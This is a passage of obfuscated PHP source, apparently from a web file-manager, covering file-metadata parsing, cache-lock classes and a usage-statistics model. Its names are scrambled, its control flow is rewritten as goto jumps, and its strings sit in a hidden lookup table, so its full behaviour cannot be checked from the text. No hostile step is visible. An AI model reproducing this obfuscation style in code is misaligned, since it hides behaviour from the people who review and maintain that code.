$d¬åÁñìŒ² = $f­ÂÎ…‹†‡[1573]; $C­Ù’á£œ = substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, $cãºƒ–í); $C­‹Çº»ÒÜ += $cãºƒ–í; } break; } goto E‹„Á©µÚ–; E‹„Á©µÚ–: return array($d¬åÁñìŒ², $C­Ù’á£œ, $C­‹Çº»ÒÜ); goto ağ¥ç„¿ôë; ağ¥ç„¿ôë: } } class GetInfo { private static $fileTypeArray; public static function get($CÕ††çº…æ) { $B¾¢¦ĞÄÑ÷ = IO::info($CÕ††çº…æ); return self::infoAdd($B¾¢¦ĞÄÑ÷); } public static function infoAdd(&$AÓÚáÆõÓØ) { goto dòò±á”¢; e˜óÑËî“Æ: $D°ã–Æ‰µ = $AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[156]]; try { if ($AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[156]] == $CéÎÉÈÃ“¯[1576]) { $dŒÅ¦’÷ÜÇ = self::psdParse($B˜šĞìŒñ‘); $D°ã–Æ‰µ = $CéÎÉÈÃ“¯[1577]; } else { if ($AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[156]] == $CéÎÉÈÃ“¯[1578]) { $dŒÅ¦’÷ÜÇ = self::pdfParse($B˜šĞìŒñ‘); } else { $D°ã–Æ‰µ = self::$fileTypeArray[$CéÎÉÈÃ“¯[1579]][$AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[156]]]; $Eºé¤ƒÖò´ = self::$fileTypeArray[$CéÎÉÈÃ“¯[1580]][$D°ã–Æ‰µ][$CéÎÉÈÃ“¯[1581]]; $A«š‰ëê¯ = @$c©–É™¸êŸ->analyze($B˜šĞìŒñ‘, $AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[77]], $AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[28]]); $dŒÅ¦’÷ÜÇ = self::parseData($A«š‰ëê¯, $Eºé¤ƒÖò´, $AÓÚáÆõÓØ); } } } catch (Exception $Eã‡ùÍÜ¢Ÿ) { $dŒÅ¦’÷ÜÇ = array($CéÎÉÈÃ“¯[377] => $D°ã–Æ‰µ); } if (!$dŒÅ¦’÷ÜÇ) { return; } goto a±¹¾¥ãÈ; a±¹¾¥ãÈ: $dŒÅ¦’÷ÜÇ[$CéÎÉÈÃ“¯[377]] = $D°ã–Æ‰µ; $AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[430]] = $dŒÅ¦’÷ÜÇ; return $AÓÚáÆõÓØ; goto EƒÕİœÔº; E´ÍÆ›è¯: if (!$AÓÚáÆõÓØ || $AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[29]] != $CéÎÉÈÃ“¯[163]) { return; } if (!self::support($AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[156]]) || isset($AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[430]])) { return; } $B˜šĞìŒñ‘ = $CéÎÉÈÃ“¯[1575] . $AÓÚáÆõÓØ[$CéÎÉÈÃ“¯[75]]; goto e˜óÑËî“Æ; dòò±á”¢: $CéÎÉÈÃ“¯ =& $_SERVER[ºÖÙÂŒäÉê‡]; static $c©–É™¸êŸ; if (!$c©–É™¸êŸ) { require SDK_DIR . $CéÎÉÈÃ“¯[1574]; $c©–É™¸êŸ = new getID3(); } goto E´ÍÆ›è¯; EƒÕİœÔº: } public static function support($AÆƒäÑ‰Ã¹) { goto dÚ’ÌÏŠ˜; dÚ’ÌÏŠ˜: $F…©”ãÆ¾Î =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $AÆƒäÑ‰Ã¹ = strtolower($AÆƒäÑ‰Ã¹); goto a‚Œ¾á‚«Ë; a‚Œ¾á‚«Ë: $Eß•ïÊ’ëĞ = array($F…©”ãÆ¾Î[1578], $F…©”ãÆ¾Î[1576]); if (in_array($AÆƒäÑ‰Ã¹, $Eß•ïÊ’ëĞ)) { return !0; } if (isset(self::$fileTypeArray[$F…©”ãÆ¾Î[1579]][$AÆƒäÑ‰Ã¹])) { return !0; } goto C»Éè­¶Ë˜; C»Éè­¶Ë˜: return !1; goto C‚Í¡¹¿ôï; C‚Í¡¹¿ôï: } private static function parseData($aäÖƒ„åñÑ, $A¼¨®÷ÙŠå, $aŸŞ‰ŠòÅ) { $fš‘îòå¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c½–ÌÆëÍ = $aäÖƒ„åñÑ[$fš‘îòå¨[1582]]; $f–Òã˜„Ãå = array(); foreach ($A¼¨®÷ÙŠå as $bŒ—ÊÙ²ê´ => $aªËÏ½Ø‰) { foreach ($aªËÏ½Ø‰ as $B¤ƒÏÓµÌÏ) { if (is_array($B¤ƒÏÓµÌÏ)) { $bó¤ –”ªæ = self::parseData($aäÖƒ„åñÑ, $aªËÏ½Ø‰, $aŸŞ‰ŠòÅ); if ($bó¤ –”ªæ) { $f–Òã˜„Ãå[$bŒ—ÊÙ²ê´] = $bó¤ –”ªæ; } break; } $d»¶œ¼¨Ó = str_replace($fš‘îòå¨[1356], $c½–ÌÆëÍ, $B¤ƒÏÓµÌÏ); $bó¤ –”ªæ = _get($aäÖƒ„åñÑ, $d»¶œ¼¨Ó); $bó¤ –”ªæ = is_array($bó¤ –”ªæ) ? $bó¤ –”ªæ[0] : $bó¤ –”ªæ; if ($bó¤ –”ªæ) { break; } } if ($bó¤ –”ªæ || $bó¤ –”ªæ === 0 || $bó¤ –”ªæ === !1) { $bó¤ –”ªæ = self::valueReset($B¤ƒÏÓµÌÏ, $bó¤ –”ªæ, $bŒ—ÊÙ²ê´); if ($bó¤ –”ªæ !== null) { $f–Òã˜„Ãå[$bŒ—ÊÙ²ê´] = $bó¤ –”ªæ; } } } $f–Òã˜„Ãå = self::valueResetAll($f–Òã˜„Ãå, $aŸŞ‰ŠòÅ); return $f–Òã˜„Ãå; } private static function psdParse($F’£äƒÄŒ) { $D³âå„¶ŒŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (IO::fileSubstr($F’£äƒÄŒ, 0, 4) != $D³âå„¶ŒŒ[1583]) { return !1; } $E­÷ÜøÆÉ = getImageSize($F’£äƒÄŒ, $cºéŞçÔÆŸ); if (!$E­÷ÜøÆÉ) { return; } $FË«Õ­ºŠ£ = array($D³âå„¶ŒŒ[1498] => $E­÷ÜøÆÉ[0], $D³âå„¶ŒŒ[1500] => $E­÷ÜøÆÉ[1]); return $FË«Õ­ºŠ£; } private static function pdfParse($CˆØ›·µ³Ò) { return FileParsePdf::parse($CˆØ›·µ³Ò); } private static function fileTypeParse() { $B¹ØŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eêÑ†Ÿßì = self::fileTypeArray(); $D®Ú‚Œïé = array(); foreach ($eêÑ†Ÿßì as $FŸ£ğ­Ñ§ô => $bÉˆæÙì´˜) { $Aì…œÌÂà“ = _get($bÉˆæÙì´˜, $B¹ØŒ[156], $B¹ØŒ[33]); $aó‰ÜÛŒÏè = is_string($Aì…œÌÂà“) ? explode($B¹ØŒ[47], $Aì…œÌÂà“) : $Aì…œÌÂà“; if (!$aó‰ÜÛŒÏè) { continue; } foreach ($aó‰ÜÛŒÏè as $Aì…œÌÂà“) { $Aì…œÌÂà“ = strtolower(trim($Aì…œÌÂà“)); if (!$Aì…œÌÂà“) { continue; } $D®Ú‚Œïé[$Aì…œÌÂà“] = $FŸ£ğ­Ñ§ô; } $eêÑ†Ÿßì[$FŸ£ğ­Ñ§ô][$B¹ØŒ[156]] = array_keys($D®Ú‚Œïé); $eêÑ†Ÿßì[$FŸ£ğ­Ñ§ô][$B¹ØŒ[1581]] = self::parseKeyMap($bÉˆæÙì´˜[$B¹ØŒ[1581]]); } return array($B¹ØŒ[1580] => $eêÑ†Ÿßì, $B¹ØŒ[1579] => $D®Ú‚Œïé); } private static function parseKeyMap($cÎ®¹…˜à–) { $BéÇ®ÕóÒ =& $_SERVER[ºÖÙÂŒäÉê‡]; foreach ($cÎ®¹…˜à– as $aÉÅ¦ãµÁ¯ => $d³¿Ò§¢ó) { if (is_array($d³¿Ò§¢ó)) { $a¶È¤©è„¤ = self::parseKeyMap($d³¿Ò§¢ó); if ($a¶È¤©è„¤) { $cÎ®¹…˜à–[$aÉÅ¦ãµÁ¯] = $a¶È¤©è„¤; } continue; } $f»®Š¹£Âæ = explode($BéÇ®ÕóÒ[47], $d³¿Ò§¢ó); $Bêé¤ñÑ¤À = array(); foreach ($f»®Š¹£Âæ as $DáÇ™‡ëÂŒ) { $DáÇ™‡ëÂŒ = trim($DáÇ™‡ëÂŒ); if (!$DáÇ™‡ëÂŒ) { continue; } if (preg_match($BéÇ®ÕóÒ[1584], $DáÇ™‡ëÂŒ, $A¼­£à‹)) { $BÛ¦Ì§´Ï = explode($BéÇ®ÕóÒ[276], $A¼­£à‹[1]); foreach ($BÛ¦Ì§´Ï as $bÈ»—ŒÕ¬ñ) { $Bêé¤ñÑ¤À[] = str_replace($A¼­£à‹[0], $bÈ»—ŒÕ¬ñ, $DáÇ™‡ëÂŒ); } } else { $Bêé¤ñÑ¤À[] = $DáÇ™‡ëÂŒ; } } $cÎ®¹…˜à–[$aÉÅ¦ãµÁ¯] = $Bêé¤ñÑ¤À; } return $cÎ®¹…˜à–; } private static function valueResetAll($DÎÍö±ôô“, $AŠ‚»ƒæÌ†) { goto b¨âì÷°Ãë; dËÄ®‚Ñ¦: return $DÎÍö±ôô“; goto CëÑ‰õÏÛ; b¨âì÷°Ãë: $Cë§« Ç³ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset($DÎÍö±ôô“[$Cë§« Ç³[1585]])) { $bãš—×ªå = ceil($DÎÍö±ôô“[$Cë§« Ç³[1585]]); $B¨®Ì’ŸË = intval($bãš—×ªå / 3600); $eÎŞ®Õ¢İ¬ = intval(($bãš—×ªå - $B¨®Ì’ŸË * 3600) / 60); $aè¾‰ô Š = $bãš—×ªå % 60; $DÎÍö±ôô“[$Cë§« Ç³[1586]] = sprintf($Cë§« Ç³[1587], $B¨®Ì’ŸË, $eÎŞ®Õ¢İ¬, $aè¾‰ô Š); if ($B¨®Ì’ŸË == 0) { $DÎÍö±ôô“[$Cë§« Ç³[1586]] = sprintf($Cë§« Ç³[1588], $eÎŞ®Õ¢İ¬, $aè¾‰ô Š); } } $Fß¬í„ëØè = _get($DÎÍö±ôô“, $Cë§« Ç³[1589]); goto Aåß•‡µøº; C¬ï´ŞÅÛ: $Bî£â×èğ· = _get($DÎÍö±ôô“, $Cë§« Ç³[1597], $Cë§« Ç³[33]); $b¯õ©İàô = $bÇ½±Çë . $aŞ©Ôì¢×± . $Bî£â×èğ·; if ($b¯õ©İàô && get_charset($b¯õ©İàô) != $Cë§« Ç³[331]) { $DÎÍö±ôô“[$Cë§« Ç³[1594]][$Cë§« Ç³[1309]] = iconv_to($DÎÍö±ôô“[$Cë§« Ç³[1594]][$Cë§« Ç³[1309]], get_charset($b¯õ©İàô), $Cë§« Ç³[331]); $DÎÍö±ôô“[$Cë§« Ç³[1594]][$Cë§« Ç³[1598]] = iconv_to($DÎÍö±ôô“[$Cë§« Ç³[1594]][$Cë§« Ç³[1598]], get_charset($b¯õ©İàô), $Cë§« Ç³[331]); $DÎÍö±ôô“[$Cë§« Ç³[1594]][$Cë§« Ç³[1599]] = iconv_to($DÎÍö±ôô“[$Cë§« Ç³[1594]][$Cë§« Ç³[1599]], get_charset($b¯õ©İàô), $Cë§« Ç³[331]); } goto dËÄ®‚Ñ¦; Aåß•‡µøº: if ($Fß¬í„ëØè) { $a’àÊ†ìã = IO_PATH_SYSTEM_TEMP . $Cë§« Ç³[1590] . KodIO::hashPath($AŠ‚»ƒæÌ†) . $Cë§« Ç³[1591]; $DÎÍö±ôô“[$Cë§« Ç³[1592]] = Action($Cë§« Ç³[1593])->pluginCacheFileSet($a’àÊ†ìã, $Fß¬í„ëØè); unset($DÎÍö±ôô“[$Cë§« Ç³[1594]][$Cë§« Ç³[1577]]); } $bÇ½±Çë = _get($DÎÍö±ôô“, $Cë§« Ç³[1595], $Cë§« Ç³[33]); $aŞ©Ôì¢×± = _get($DÎÍö±ôô“, $Cë§« Ç³[1596], $Cë§« Ç³[33]); goto C¬ï´ŞÅÛ; CëÑ‰õÏÛ: } private static function valueReset($A³ù‹áÚ³¸, $Cí’¨œ«, $aÛ¤„ô±Â) { $fïãÊ”×ŠÛ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f‘µñŠ²ˆÛ = $fïãÊ”×ŠÛ[1515]; switch ($A³ù‹áÚ³¸) { case $fïãÊ”×ŠÛ[1600]: $Cí’¨œ« = $Cí’¨œ« == $fïãÊ”×ŠÛ[83] ? $fïãÊ”×ŠÛ[1601] : $fïãÊ”×ŠÛ[1602]; break; case $fïãÊ”×ŠÛ[1603]: $Cí’¨œ« = $Cí’¨œ« ? $Cí’¨œ« : null; break; default: break; } switch ($aÛ¤„ô±Â) { case $fïãÊ”×ŠÛ[1604]: $Cí’¨œ« = round($Cí’¨œ«, 2); break; case $fïãÊ”×ŠÛ[193]: case $fïãÊ”×ŠÛ[106]: if ($Cí’¨œ« < 0) { $Cí’¨œ« = null; } else { if (is_numeric($Cí’¨œ«)) { $Cí’¨œ« = date($f‘µñŠ²ˆÛ, $Cí’¨œ«); } } break; default: break; } return $Cí’¨œ«; } private static function fileTypeArray() { $DÔšÇì×™• =& $_SERVER[ºÖÙÂŒäÉê‡]; return array($DÔšÇì×™•[1577] => array($DÔšÇì×™•[156] => $DÔšÇì×™•[1605] . $DÔšÇì×™•[1606], $DÔšÇì×™•[1581] => array($DÔšÇì×™•[1498] => $DÔšÇì×™•[1607], $DÔšÇì×™•[1500] => $DÔšÇì×™•[1608], $DÔšÇì×™•[1609] => $DÔšÇì×™•[1610], $DÔšÇì×™•[1611] => $DÔšÇì×™•[1612], $DÔšÇì×™•[193] => $DÔšÇì×™•[1613], $DÔšÇì×™•[106] => $DÔšÇì×™•[1614], $DÔšÇì×™•[1615] => $DÔšÇì×™•[1616], $DÔšÇì×™•[1617] => $DÔšÇì×™•[1618], $DÔšÇì×™•[1619] => $DÔšÇì×™•[1620], $DÔšÇì×™•[1621] => $DÔšÇì×™•[1622], $DÔšÇì×™•[1623] => $DÔšÇì×™•[1624], $DÔšÇì×™•[1625] => $DÔšÇì×™•[1626], $DÔšÇì×™•[1627] => $DÔšÇì×™•[1628], $DÔšÇì×™•[1629] => array($DÔšÇì×™•[1630] => $DÔšÇì×™•[1631], $DÔšÇì×™•[1632] => $DÔšÇì×™•[1633], $DÔšÇì×™•[1634] => $DÔšÇì×™•[1635]), $DÔšÇì×™•[1636] => $DÔšÇì×™•[1637], $DÔšÇì×™•[1638] => $DÔšÇì×™•[1639], $DÔšÇì×™•[1640] => $DÔšÇì×™•[1641], $DÔšÇì×™•[1642] => $DÔšÇì×™•[1643], $DÔšÇì×™•[1644] => array($DÔšÇì×™•[1645] => $DÔšÇì×™•[1646], $DÔšÇì×™•[1647] => $DÔšÇì×™•[1648], $DÔšÇì×™•[1649] => $DÔšÇì×™•[1650], $DÔšÇì×™•[1651] => $DÔšÇì×™•[1652], $DÔšÇì×™•[1653] => $DÔšÇì×™•[1654], $DÔšÇì×™•[1655] => $DÔšÇì×™•[1656], $DÔšÇì×™•[1657] => $DÔšÇì×™•[1658], $DÔšÇì×™•[1659] => $DÔšÇì×™•[1660], $DÔšÇì×™•[1661] => $DÔšÇì×™•[1662], $DÔšÇì×™•[1663] => $DÔšÇì×™•[1664], $DÔšÇì×™•[1665] => $DÔšÇì×™•[1666]))), $DÔšÇì×™•[1667] => array($DÔšÇì×™•[156] => $DÔšÇì×™•[1668] . $DÔšÇì×™•[1669], $DÔšÇì×™•[1581] => array($DÔšÇì×™•[1585] => $DÔšÇì×™•[1670], $DÔšÇì×™•[193] => $DÔšÇì×™•[1671], $DÔšÇì×™•[106] => $DÔšÇì×™•[1672], $DÔšÇì×™•[1617] => $DÔšÇì×™•[1673], $DÔšÇì×™•[1674] => $DÔšÇì×™•[1675], $DÔšÇì×™•[1676] => $DÔšÇì×™•[1603], $DÔšÇì×™•[1677] => $DÔšÇì×™•[1678], $DÔšÇì×™•[1679] => $DÔšÇì×™•[1680], $DÔšÇì×™•[1681] => $DÔšÇì×™•[1682], $DÔšÇì×™•[1594] => array($DÔšÇì×™•[1309] => $DÔšÇì×™•[1683], $DÔšÇì×™•[1598] => $DÔšÇì×™•[1684], $DÔšÇì×™•[1599] => $DÔšÇì×™•[1685], $DÔšÇì×™•[1686] => $DÔšÇì×™•[1687], $DÔšÇì×™•[1688] => $DÔšÇì×™•[1689], $DÔšÇì×™•[1690] => $DÔšÇì×™•[1691], $DÔšÇì×™•[1577] => $DÔšÇì×™•[1692]))), $DÔšÇì×™•[1693] => array($DÔšÇì×™•[156] => $DÔšÇì×™•[1694] . $DÔšÇì×™•[1695], $DÔšÇì×™•[1581] => array($DÔšÇì×™•[1498] => $DÔšÇì×™•[1696], $DÔšÇì×™•[1500] => $DÔšÇì×™•[1697], $DÔšÇì×™•[1585] => $DÔšÇì×™•[1670], $DÔšÇì×™•[193] => $DÔšÇì×™•[1698], $DÔšÇì×™•[106] => $DÔšÇì×™•[1699], $DÔšÇì×™•[1604] => $DÔšÇì×™•[1700], $DÔšÇì×™•[1681] => $DÔšÇì×™•[1701], $DÔšÇì×™•[1677] => $DÔšÇì×™•[1702], $DÔšÇì×™•[1617] => $DÔšÇì×™•[1703], $DÔšÇì×™•[1667] => array($DÔšÇì×™•[1676] => $DÔšÇì×™•[1603], $DÔšÇì×™•[1704] => $DÔšÇì×™•[1705], $DÔšÇì×™•[1674] => $DÔšÇì×™•[1675], $DÔšÇì×™•[1681] => $DÔšÇì×™•[1682], $DÔšÇì×™•[1677] => $DÔšÇì×™•[1706], $DÔšÇì×™•[1679] => $DÔšÇì×™•[1680]))), $DÔšÇì×™•[1707] => array($DÔšÇì×™•[1581] => array($DÔšÇì×™•[1708] => $DÔšÇì×™•[1709], $DÔšÇì×™•[1710] => $DÔšÇì×™•[1711])), $DÔšÇì×™•[1712] => array($DÔšÇì×™•[1581] => array())); } } goto d±°¯®‰‡ì; eçˆËïß†î: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $eñ¬‘‡ì¸‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d¦’’ ã‰¹ = $GLOBALS[$eñ¬‘‡ì¸‰[6]][$eñ¬‘‡ì¸‰[342]]; self::$cachePath = $d¦’’ ã‰¹[$eñ¬‘‡ì¸‰[163]][$eñ¬‘‡ì¸‰[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($DùëŞ”Ş¹‡, $aÛ‘Ò¹™Ï— = 0) { goto E÷ˆà—ö¶»; bŒ–Ö‰–¬Õ: $E½Ğé±ÉÀ¿ = rtrim(self::$cachePath, $A„ê¤ Ü[8]) . $A„ê¤ Ü[771] . md5($DùëŞ”Ş¹‡) . $A„ê¤ Ü[772]; if (file_exists($E½Ğé±ÉÀ¿) && filemtime($E½Ğé±ÉÀ¿) && filemtime($E½Ğé±ÉÀ¿) < time() - 10) { @unlink($E½Ğé±ÉÀ¿); } do { if (file_exists($E½Ğé±ÉÀ¿)) { cacheLockWait(); continue; } $cŞŞù£„‰Õ = fopen($E½Ğé±ÉÀ¿, $A„ê¤ Ü[773]); if (!$cŞŞù£„‰Õ) { return !1; } $a§ùŒÚÂ = flock($cŞŞù£„‰Õ, LOCK_EX | LOCK_NB); self::$caches[$DùëŞ”Ş¹‡] = array($A„ê¤ Ü[774] => $cŞŞù£„‰Õ, $A„ê¤ Ü[163] => $E½Ğé±ÉÀ¿); fwrite($cŞŞù£„‰Õ, $céöš‰¾Ö); clearstatcache(); if ($cŞŞù£„‰Õ && $a§ùŒÚÂ) { return !0; } cacheLockWait(); } while (microtime(!0) < $céöš‰¾Ö); goto DŠÀÛ´ÙéÄ; DŠÀÛ´ÙéÄ: $this->unlock($DùëŞ”Ş¹‡); return !1; goto Fñê„ŠšŸ“; E÷ˆà—ö¶»: $A„ê¤ Ü =& $_SERVER[ºÖÙÂŒäÉê‡]; $b¼æ™ÆƒÖø = microtime(!0); $céöš‰¾Ö = $b¼æ™ÆƒÖø + $aÛ‘Ò¹™Ï— + 0.0001; goto bŒ–Ö‰–¬Õ; Fñê„ŠšŸ“: } public function lockGet($d“îª²ˆ®Ş) { $BÙËÂ‹µ›® =& $_SERVER[ºÖÙÂŒäÉê‡]; $eĞà¿„÷Ø = rtrim(self::$cachePath, $BÙËÂ‹µ›®[8]) . $BÙËÂ‹µ›®[771] . md5($d“îª²ˆ®Ş) . $BÙËÂ‹µ›®[772]; return file_exists($eĞà¿„÷Ø); } public function unlock($bÆóç³’ Ò) { goto Aè‚‹†éÆ½; Aè‚‹†éÆ½: $eÖ¹²·‰È =& $_SERVER[ºÖÙÂŒäÉê‡]; $EŞòáÔõÏˆ = self::$caches[$bÆóç³’ Ò]; if (!$EŞòáÔõÏˆ) { return; } goto dÄœªÖ›ï¨; EŠíµ‹›Á²: unset(self::$caches[$bÆóç³’ Ò]); goto AæóõÇ©îµ; dÄœªÖ›ï¨: @flock($EŞòáÔõÏˆ[$eÖ¹²·‰È[774]], LOCK_UN); @fclose($EŞòáÔõÏˆ[$eÖ¹²·‰È[774]]); @unlink($EŞòáÔõÏˆ[$eÖ¹²·‰È[163]]); goto EŠíµ‹›Á²; AæóõÇ©îµ: } } class CacheLockRedis { public function lock($CŸÂ„§È, $a›¢¬Ìº› = 10) { $dÑ˜áçœ£ = Cache::init(); $c®°ˆÃõ†Æ = microtime(!0) + $a›¢¬Ìº›; while (microtime(!0) < $c®°ˆÃõ†Æ) { $f•ˆï¥Ë = $dÑ˜áçœ£->get($CŸÂ„§È); if (!$f•ˆï¥Ë) { $c›·œ¦©ã = $dÑ˜áçœ£->setLock($CŸÂ„§È, $c®°ˆÃõ†Æ, $a›¢¬Ìº›); if ($c›·œ¦©ã) { return !0; } } else { if ($f•ˆï¥Ë < microtime(!0)) { $dÑ˜áçœ£->set($CŸÂ„§È, $c®°ˆÃõ†Æ, $c®°ˆÃõ†Æ); if ($dÑ˜áçœ£->get($CŸÂ„§È) === $f•ˆï¥Ë) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($c·‚àÁ³š) { return Cache::init()->get($c·‚àÁ³š); } public function unlock($a˜«ğ ë«) { return Cache::init()->remove($a˜«ğ ë«); } } class CacheLockMemcached { public function lock($bŞ×†³„ƒ, $a­ùËÓŒ„ = 0) { $BÊ¹¾Ôµ›Ô = Cache::init(); $AÖ´ÙŒŞÂõ = microtime(!0) + $a­ùËÓŒ„; while (microtime(!0) < $AÖ´ÙŒŞÂõ) { $F¶÷ÍÅ«ƒì = $BÊ¹¾Ôµ›Ô->get($bŞ×†³„ƒ); if (!$F¶÷ÍÅ«ƒì || $F¶÷ÍÅ«ƒì < microtime(!0)) { $bÍ¬±Û´Ø„ = $BÊ¹¾Ôµ›Ô->handle->add($bŞ×†³„ƒ, $AÖ´ÙŒŞÂõ, $a­ùËÓŒ„); if ($bÍ¬±Û´Ø„) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Eó’ì…Åˆò) { return Cache::init()->get($Eó’ì…Åˆò); } public function unlock($BøÀÍÅ¸Ó¬) { return Cache::init()->remove($BøÀÍÅ¸Ó¬); } } goto Eœà‘™Üô; C ¢¹Ùƒ¿: class AnalysisModel extends ModelBaseLight { public function init($CäòİÈÕÛ) { $C‰‹¸…ºä =& $_SERVER[ºÖÙÂŒäÉê‡]; $a÷¤Î¸œŠÉ = array($C‰‹¸…ºä[539] => array($C‰‹¸…ºä[29] => $C‰‹¸…ºä[1992], $C‰‹¸…ºä[266] => array($C‰‹¸…ºä[216], $C‰‹¸…ºä[697], $C‰‹¸…ºä[1993], $C‰‹¸…ºä[1994])), $C‰‹¸…ºä[1995] => array($C‰‹¸…ºä[29] => $C‰‹¸…ºä[1996], $C‰‹¸…ºä[266] => array($C‰‹¸…ºä[216], $C‰‹¸…ºä[695], $C‰‹¸…ºä[1997], $C‰‹¸…ºä[1998], $C‰‹¸…ºä[1999]))); if (!isset($a÷¤Î¸œŠÉ[$CäòİÈÕÛ])) { return !1; } $this->optionType = $a÷¤Î¸œŠÉ[$CäòİÈÕÛ][$C‰‹¸…ºä[29]]; $this->field = $a÷¤Î¸œŠÉ[$CäòİÈÕÛ][$C‰‹¸…ºä[266]]; return !0; } public function listData($DÃ®ê‘’Ÿ = false, $a‰ã§‹ª = "\x6d\157\x64\151\146\171\124\x69\155\x65", $D¯äÖÇğø = false) { return parent::listData($DÃ®ê‘’Ÿ, $a‰ã§‹ª, $D¯äÖÇğø); } public function trendList($DµŸÏ¬»Ÿ¬) { goto cÓí¦‘¡; CèâôÄã“Ï: if (!isset($E„‡‡•„Ì)) { $CâàŸÀ¦°ù = $DµŸÏ¬»Ÿ¬ == $eª¶’ÜŞÒ[539] ? $eª¶’ÜŞÒ[481] : $eª¶’ÜŞÒ[751]; $E„‡‡•„Ì = Model($CâàŸÀ¦°ù)->min($eª¶’ÜŞÒ[193]); } $EºïÒ­¹ê = $eª¶’ÜŞÒ[2002] . ucfirst($DµŸÏ¬»Ÿ¬); $CššâæõˆÍ = $this->dateList($E„‡‡•„Ì); goto fîÉÕ¯¬À„; fîÉÕ¯¬À„: foreach ($CššâæõˆÍ as $aÔ°ŞíµÏÃ) { $this->{$EºïÒ­¹ê}($aÔ°ŞíµÏÃ); } return $this->listData(); goto CÃçğ°²ÙŠ; cÓí¦‘¡: $eª¶’ÜŞÒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bĞË ŒŠ = $this->listData(); if ($bĞË ŒŠ) { $FÀÛ­¼£¢ = end($bĞË ŒŠ); $aÔ°ŞíµÏÃ = date($eª¶’ÜŞÒ[2000], strtotime($eª¶’ÜŞÒ[2001])); if ($FÀÛ­¼£¢[$eª¶’ÜŞÒ[216]] == $aÔ°ŞíµÏÃ) { return $bĞË ŒŠ; } $E„‡‡•„Ì = strtotime($FÀÛ­¼£¢[$eª¶’ÜŞÒ[216]]); } goto CèâôÄã“Ï; CÃçğ°²ÙŠ: } private function dateList($b°Îøæ«ß¢) { $dŸË¥öÛèç =& $_SERVER[ºÖÙÂŒäÉê‡]; $cø ÎáÆ¿‚ = $b°Îøæ«ß¢; $bˆ‚±óÀÛ = strtotime($dŸË¥öÛèç[2001]); $fËô¢±ê‡ã = array(); while ($cø ÎáÆ¿‚ <= $bˆ‚±óÀÛ) { $fËô¢±ê‡ã[] = date($dŸË¥öÛèç[2000], $cø ÎáÆ¿‚); $cø ÎáÆ¿‚ = strtotime($dŸË¥öÛèç[2003], $cø ÎáÆ¿‚); } return $fËô¢±ê‡ã; } public function _recordUser($A£‡Ü©§Àˆ = '') { goto Bîø‰¥Î‘’; DÇšÅ»ï­¨: $d­‚ˆ÷©½¸ = array($C¿‹Ë†éÖÚ[193] => array($C¿‹Ë†éÖÚ[919], $AËø†Ì¢å)); $d‚Íù¶Ü‘õ = Model($C¿‹Ë†éÖÚ[481])->where($d­‚ˆ÷©½¸)->count($C¿‹Ë†éÖÚ[1403]); $d­‚ˆ÷©½¸[$C¿‹Ë†éÖÚ[193]] = array($C¿‹Ë†éÖÚ[326], array($AÖŒÖ•­õ‹, $AËø†Ì¢å)); goto FéÕœ„‡÷î; Bîø‰¥Î‘’: $C¿‹Ë†éÖÚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $AÖŒÖ•­õ‹ = strtotime(date($C¿‹Ë†éÖÚ[2004], strtotime($A£‡Ü©§Àˆ))); $AËø†Ì¢å = strtotime(date($C¿‹Ë†éÖÚ[2005], strtotime($A£‡Ü©§Àˆ))); goto DÇšÅ»ï­¨; b¬øê²Æ‰¾: $EÆØ»¯’Û¦ = array($C¿‹Ë†éÖÚ[216] => $A£‡Ü©§Àˆ, $C¿‹Ë†éÖÚ[697] => (int) $d‚Íù¶Ü‘õ, $C¿‹Ë†éÖÚ[1993] => (int) $D¦ƒÛ…ÃÜ¹, $C¿‹Ë†éÖÚ[1994] => (int) $EáòÉ¾Í); return $this->insert($EÆØ»¯’Û¦); goto C†Ä¾ÅÀ; FéÕœ„‡÷î: $D¦ƒÛ…ÃÜ¹ = Model($C¿‹Ë†éÖÚ[481])->where($d­‚ˆ÷©½¸)->count($C¿‹Ë†éÖÚ[1403]); $d­‚ˆ÷©½¸[$C¿‹Ë†éÖÚ[29]] = $C¿‹Ë†éÖÚ[2006]; $EáòÉ¾Í = Model($C¿‹Ë†éÖÚ[2007])->where($d­‚ˆ÷©½¸)->count($C¿‹Ë†éÖÚ[2008]); goto b¬øê²Æ‰¾; C†Ä¾ÅÀ: } public function _recordStore($aªÏ“¬‘™ª = '') { goto CÕŠ†š÷ŠÎ; DÇÌªÆî‘: $c¦…Óè–[$dì¬áé«ë®[376]] = 1; $E™Ÿ „¯İÁ = Model($dì¬áé«ë®[751])->where($c¦…Óè–)->sum($dì¬áé«ë®[77]); $c¦…Óè–[$dì¬áé«ë®[376]] = 2; goto fØˆ©š‚; BÊ¦ÁĞÏ„: $c†¢»˜¹Ë = Model($dì¬áé«ë®[426])->where($c¦…Óè–)->sum($dì¬áé«ë®[77]); $c¦…Óè–[$dì¬áé«ë®[375]] = 0; $Eõ¥Îˆ’µ˜ = Model($dì¬áé«ë®[751])->where($c¦…Óè–)->sum($dì¬áé«ë®[77]); goto DÇÌªÆî‘; CÕŠ†š÷ŠÎ: $dì¬áé«ë® =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bî¦ìÉãŠ = strtotime(date($dì¬áé«ë®[2005], strtotime($aªÏ“¬‘™ª))); $c¦…Óè– = array($dì¬áé«ë®[193] => array($dì¬áé«ë®[919], 